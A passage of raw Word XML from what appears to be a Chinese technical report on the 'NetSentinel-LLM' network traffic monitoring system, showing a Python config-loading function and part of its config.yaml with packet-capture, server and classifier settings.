        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284D9E8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CA0561E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="445241F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def load_config(path="config.yaml") -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5128C3CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    path = Path(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5712CD3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not path.exists():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B967F5F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise SystemExit(f"找不到配置文件 {path}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6488D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with path.open("r", encoding="utf-8") as fh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B45478D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cfg = yaml.safe_load(fh) or {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18EB94B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    local = path.with_name(path.stem + ".local" + path.suffix)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B25A0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if local.exists():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE3F9D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with local.open("r", encoding="utf-8") as fh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C03D6C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            cfg = deep_merge(cfg, yaml.safe_load(fh) or {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C03872E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return cfg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6104E521">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EEB30AC">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-2　config.yaml</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（115 行）　统一配置（仅存密钥的环境变量名，不含明文 key）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="605BF7C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># NetSentinel-LLM 统一配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F7A3AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 本文件是默认值；本地覆盖写 config.local.yaml，加载时深度合并，不进版本库。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8ECBF6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C9BF61D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>project:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D56CAC9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  name: NetSentinel-LLM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F9C1A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  version: 0.1.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55018B71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69AFF1CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>probe:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B15627">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  interface: auto           # 网卡名；auto 表示自动挑一张有流量的接口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09147034">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  bpf_filter: ""            # BPF 过滤表达式，空表示全量抓包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D13BC36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  snapshot_len: 65535</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDCE770">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  promisc: true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E14A22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  aggregate_window: 2.0     # 会话特征聚合窗口，单位秒</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107063E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  max_flows: 5000           # 内存中同时保留的会话数上限，超出按最近活跃淘汰</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE773C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  pcap_dir: data/pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE52EC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  feature_csv_dir: data/features</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAD1D48">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28D5BD46">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>center:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F139E3B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  host: 0.0.0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25865DFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  port: 8000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2D73BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  token: change-me          # 探针上报鉴权；部署时务必改</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA201A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  db_path: data/netsentinel.db</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C49DE14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  model_path: models/artifacts/best_model.pkl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73704012">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  schema_path: models/artifacts/feature_schema.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0611B43D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EF83C57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>model:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C75FB0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # M8 五模型对比实验；线上推理只加载评估阶段选出的 best_model.pkl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8FEFD2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  candidates:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002064D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    - decision_tree</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6C7EA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    - random_forest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65774DFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    - xgboost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253EFE65">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    - logistic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7732054A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    - hybrid_forest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0ED19D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  test_size: 0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4026C374">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  val_size: 0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3E2204">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  random_state: 42</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B60E6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78448189">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  # 各模型超参：同一份特征、同一划分、同一随机种子，保证同口径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D5427C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  decision_tree:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058F05D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    max_depth: 24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEC170D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    class_weight: balanced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E030F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F6DADA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  random_forest:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9755E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_estimators: 100</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287023D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
